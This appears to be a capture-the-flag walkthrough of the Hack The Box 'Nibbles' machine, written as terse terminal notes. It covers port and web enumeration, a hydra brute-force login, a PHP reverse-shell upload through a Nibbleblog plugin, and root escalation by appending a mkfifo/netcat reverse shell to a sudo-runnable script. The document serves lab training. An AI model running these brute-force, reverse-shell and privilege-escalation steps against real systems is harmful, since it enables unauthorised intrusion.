@@ -1,0 +1,417 @@
+RECON
+root@kali:~/htb/nibbles# nmap -sC -sV -p- -vv -oA full 10.10.10.75
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
+|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+WEB ENUM
+root@kali:~/htb/nibbles# nikto -h http://10.10.10.75
+- Nikto v2.1.6
++ Server: Apache/2.4.18 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x5d 0x5616c3cf7fa77 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7499 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2020-11-19 21:23:28 (GMT-5) (174 seconds)
+
+root@kali:~/htb/nibbles# /root/dirsearch/dirsearch.py -u http://10.10.10.75 -e asp,aspx,bat,c,cfm,cgi,com,dll,exe,htm,html,inc,jhtml,jsa,jsp,log,mdb,nsf,php,phtml,pl,reg,sh,shtml,sql,txt,xml,/,js,conf -x 403,400 
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: asp, aspx, bat, c, cfm, cgi, com, dll, exe, htm, html, inc, jhtml, jsa, jsp, log, mdb, nsf, php, phtml, pl, reg, sh, shtml, sql, txt, xml, /, js, conf | HTTP method: GET | Threads: 20 | Wordlist size: 21626
+
+Error Log: /root/dirsearch/logs/errors-20-11-19_21-25-06.log
+
+Target: http://10.10.10.75/
+
+Output File: /root/dirsearch/reports/10.10.10.75/_20-11-19_21-25-06.txt
+
+[21:25:06] Starting: 
+[21:25:07] 200 -   93B  - ///
+[21:25:33] 200 -   93B  - //index.html
+
+VIEW PAGE SOURCE
+view-source:http://10.10.10.75/
+<!-- /nibbleblog/ directory. Nothing interesting here! -->
+
+BROWSE NIBBLEBLOG
+http://10.10.10.75/nibbleblog/
+
+RUN WEB ENUM AGAIN
+root@kali:~/htb/nibbles# /root/dirsearch/dirsearch.py -u http://10.10.10.75/nibbleblog -e asp,aspx,bat,c,cfm,cgi,com,dll,exe,htm,html,inc,jhtml,jsa,jsp,log,mdb,nsf,php,phtml,pl,reg,sh,shtml,sql,txt,xml,/,js,conf -x 403,400 
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: asp, aspx, bat, c, cfm, cgi, com, dll, exe, htm, html, inc, jhtml, jsa, jsp, log, mdb, nsf, php, phtml, pl, reg, sh, shtml, sql, txt, xml, /, js, conf | HTTP method: GET | Threads: 20 | Wordlist size: 21626
+
+Error Log: /root/dirsearch/logs/errors-20-11-20_11-35-58.log
+
+Target: http://10.10.10.75/nibbleblog/
+
+Output File: /root/dirsearch/reports/10.10.10.75/.nibbleblog_20-11-20_11-35-58.txt
+
+[11:35:58] Starting: 
+[11:36:00] 200 -    3KB - //nibbleblog//
+[11:36:08] 200 -   34KB - //nibbleblog/LICENSE.txt
+[11:36:11] 301 -  321B  - //nibbleblog/admin  ->  http://10.10.10.75/nibbleblog/admin/
+[11:36:11] 200 -    2KB - //nibbleblog/admin/
+[11:36:12] 200 -    1KB - //nibbleblog/admin.php
+[11:36:12] 200 -    2KB - //nibbleblog/admin/?/login
+[11:36:12] 301 -  332B  - //nibbleblog/admin/js/tinymce  ->  http://10.10.10.75/nibbleblog/admin/js/tinymce/
+[11:36:12] 200 -    2KB - //nibbleblog/admin/js/tinymce/
+[11:36:28] 301 -  323B  - //nibbleblog/content  ->  http://10.10.10.75/nibbleblog/content/
+[11:36:34] 200 -    3KB - //nibbleblog/index.php
+[11:36:34] 200 -    3KB - //nibbleblog/index.php/login/
+[11:36:34] 200 -   78B  - //nibbleblog/install.php
+[11:36:35] 301 -  325B  - //nibbleblog/languages  ->  http://10.10.10.75/nibbleblog/languages/
+[11:36:45] 301 -  323B  - //nibbleblog/plugins  ->  http://10.10.10.75/nibbleblog/plugins/
+[11:36:51] 301 -  322B  - //nibbleblog/themes  ->  http://10.10.10.75/nibbleblog/themes/
+[11:36:52] 200 -    2KB - //nibbleblog/update.php
+
+root@kali:~/htb/nibbles# gobuster -u http://10.10.10.75/nibbleblog -x "cgi,com,htm,html,log,php,pl,txt,conf" -t 40 -s "200,204,301,302,307" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.75/nibbleblog/
+[+] Threads      : 40
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307
+[+] Extensions   : .cgi,.com,.htm,.html,.log,.php,.pl,.txt,.conf
+=====================================================
+/index.php (Status: 200)
+/sitemap.php (Status: 200)
+/content (Status: 301)
+/themes (Status: 301)
+/feed.php (Status: 200)
+/admin (Status: 301)
+/admin.php (Status: 200)
+/plugins (Status: 301)
+/install.php (Status: 200)
+/update.php (Status: 200)
+/README (Status: 200)
+/languages (Status: 301)
+/LICENSE.txt (Status: 200)
+/COPYRIGHT.txt (Status: 200)
+
+VERSION
+http://10.10.10.75//nibbleblog/README
+====== Nibbleblog ======
+Version: v4.0.3
+Codename: Coffee
+Release date: 2014-04-01
+
+SEARCH FOR EXPLOITS
+root@kali:~/htb/nibbles# searchsploit nibbleblog 4
+---------------------------------------------------- ----------------------------------------
+ Exploit Title                                      |  Path
+                                                    | (/usr/share/exploitdb/)
+---------------------------------------------------- ----------------------------------------
+Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploi | exploits/php/remote/38489.rb
+---------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+
+BRUTE FORCE LOGIN TO NIBBLEBLOG
+
+HYDRA 
+POST /nibbleblog/admin.php HTTP/1.1
+Host: 10.10.10.75
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.75/nibbleblog/admin.php
+Cookie: PHPSESSID=ngpecgkqlcoiebddhpkhshock4
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+username=nibble&password=blobl
+
+hydra -l nibble -P /usr/share/wordlists/rockyou.txt 10.10.10.75 -V http-form-post '/nibbleblog/admin.php:username=^USER^&password=^PASS^:PHPSESSID=ngpecgkqlcoiebddhpkhshock4:S=Incorrect username or password'
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 -V http-post-form '/nibbleblog/admin.php:username=^USER^&password=^PASS^:PHPSESSID=ngpecgkqlcoiebddhpkhshock4:S=Incorrect username or password'
+
+GUESS CREDENTIALS USING ADMIN AND NIBBLES
+username:admin
+password:nibbles
+
+SEARCH FOR ALTERNATIVE EXPLOIT FOR REVERSE SHELL
+https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html
+
+UPLOAD PHP REVERSE SHELL TO PLUGIN LINK
+http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
+
+START REVERSE SHELL
+
+TRIGGER REVERSE SHELL
+10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
+root@kali:~/htb/nibbles# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.10.75: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.75] 56556
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 15:53:55 up 18:36,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+
+KERNEL EXPLOITATION UNLIKELY BASED ON KERNAL AGE
+$ lsb_release -a
+Distributor ID:	Ubuntu
+Description:	Ubuntu 16.04.3 LTS
+Release:	16.04
+Codename:	xenial
+No LSB modules are available.
+
+REVIEW SUDO PERMISSIONS
+$ sudo -l
+sudo: unable to resolve host Nibbles: Connection timed out
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+$ ls -l /home/nibbler
+total 8
+-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
+-r-------- 1 nibbler nibbler   33 Nov 19 21:17 user.txt
+
+GET USER FLAG
+$ cat /home/nibbler/user.txt
+#########################################
+$ cat /home/nibbler/personal/stuff/monitor.sh
+cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory
+
+UNZIP THE ZIPPED PERSONAL FILE
+$ cd /home/nibbler
+$ ls -l
+total 8
+-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
+-r-------- 1 nibbler nibbler   33 Nov 19 21:17 user.txt
+$ unzip personal.zip
+Archive:  personal.zip
+   creating: personal/
+   creating: personal/stuff/
+  inflating: personal/stuff/monitor.sh  
+$ ls -l
+total 12
+drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 personal
+-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
+-r-------- 1 nibbler nibbler   33 Nov 19 21:17 user.txt
+
+REVIEW MONITOR SCRIPT PERMISSIONS
+$ ls -la  /home/nibbler/personal/stuff/          
+total 12
+drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
+drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
+-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
+
+
+READ THE MONITOR SCRIPT
+$ cat /home/nibbler/personal/stuff/monitor.sh
+                  ####################################################################################################
+                  #                                        Tecmint_monitor.sh                                        #
+                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
+                  # If any bug, report us in the link below                                                          #
+                  # Free to use/edit/distribute the code below by                                                    #
+                  # giving proper credit to Tecmint.com and Author                                                   #
+                  #                                                                                                  #
+                  ####################################################################################################
+#! /bin/bash
+# unset any variable which system may be using
+
+# clear the screen
+clear
+
+unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+
+while getopts iv name
+do
+        case $name in
+          i)iopt=1;;
+          v)vopt=1;;
+          *)echo "Invalid arg";;
+        esac
+done
+
+if [[ ! -z $iopt ]]
+then
+{
+wd=$(pwd)
+basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
+scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
+su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
+}
+fi
+
+if [[ ! -z $vopt ]]
+then
+{
+echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
+}
+fi
+
+if [[ $# -eq 0 ]]
+then
+{
+
+
+# Define Variable tecreset
+tecreset=$(tput sgr0)
+
+# Check if connected to Internet or not
+ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"
+
+# Check OS Type
+os=$(uname -o)
+echo -e '\E[32m'"Operating System Type :" $tecreset $os
+
+# Check OS Release Version and Name
+cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
+echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
+echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"
+
+# Check Architecture
+architecture=$(uname -m)
+echo -e '\E[32m'"Architecture :" $tecreset $architecture
+
+# Check Kernel Release
+kernelrelease=$(uname -r)
+echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease
+
+# Check hostname
+echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME
+
+# Check Internal IP
+internalip=$(hostname -I)
+echo -e '\E[32m'"Internal IP :" $tecreset $internalip
+
+# Check External IP
+externalip=$(curl -s ipecho.net/plain;echo)
+echo -e '\E[32m'"External IP : $tecreset "$externalip
+
+# Check DNS
+nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
+echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 
+
+# Check Logged In Users
+who>/tmp/who
+echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 
+
+# Check RAM and SWAP Usages
+free -h | grep -v + > /tmp/ramcache
+echo -e '\E[32m'"Ram Usages :" $tecreset
+cat /tmp/ramcache | grep -v "Swap"
+echo -e '\E[32m'"Swap Usages :" $tecreset
+cat /tmp/ramcache | grep -v "Mem"
+
+# Check Disk Usages
+df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
+echo -e '\E[32m'"Disk Usages :" $tecreset 
+cat /tmp/diskusage
+
+# Check Load Average
+loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
+echo -e '\E[32m'"Load Average :" $tecreset $loadaverage
+
+# Check System Uptime
+tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
+echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime
+
+# Unset Variables
+unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+
+# Remove Temporary Files
+rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
+}
+fi
+shift $(($OPTIND -1))
+
+TRANSFER MONITOR SCRIPT
+nc -w 3 10.10.14.8 4444 < monitor.sh
+nc -lvnp 4444 > monitor.sh
+
+ADD BASH REVERSE SHELL TO MONITOR.SH (APPEND TO END OF FILE OR BY ITSELF)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f
+
+BACKUP MONITOR SCRIPT
+$ ls -l
+total 4
+-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
+$ cp monitor.sh monitor.sh.old
+$ ls -l
+total 8
+-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
+-rwxrwxrwx 1 nibbler nibbler 4015 Nov 20 16:45 monitor.sh.old
+$ rm -r monitor.sh
+
+UPLOAD MODIFIED MONITOR SCRIPT
+$ wget 10.10.14.8/monitor.sh
+--2020-11-20 16:46:00--  http://10.10.14.8/monitor.sh
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4093 (4.0K) [text/x-sh]
+Saving to: 'monitor.sh'
+
+     0K ...                                                   100% 13.0M=0s
+
+2020-11-20 16:46:00 (13.0 MB/s) - 'monitor.sh' saved [4093/4093]
+
+$ ls -la
+total 16
+drwxr-xr-x 2 nibbler nibbler 4096 Nov 20 16:46 .
+drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
+-rw-rw-rw- 1 nibbler nibbler 4093 Nov 20 16:39 monitor.sh
+-rwxrwxrwx 1 nibbler nibbler 4015 Nov 20 16:45 monitor.sh.old
+$ ls -l
+total 8
+-rw-rw-rw- 1 nibbler nibbler 4093 Nov 20 16:39 monitor.sh
+-rwxrwxrwx 1 nibbler nibbler 4015 Nov 20 16:45 monitor.sh.old
+
+MAKE MONITOR SCRIPT EXECUTABLE
+$ chmod +x monitor.sh
+
+RUN MONITOR SCRIPT AS SUDO
+$ sudo ./monitor.sh
+sudo: unable to resolve host Nibbles: Connection timed out
+
+GET ROOT SHELL
+root@kali:~/htb/nibbles# nc -lvp 4444
+listening on [any] 4444 ...
+10.10.10.75: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.75] 49336
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+GET ROOT FLAG
+# cat /root/root.txt
+######################################
+
+
+
+
+
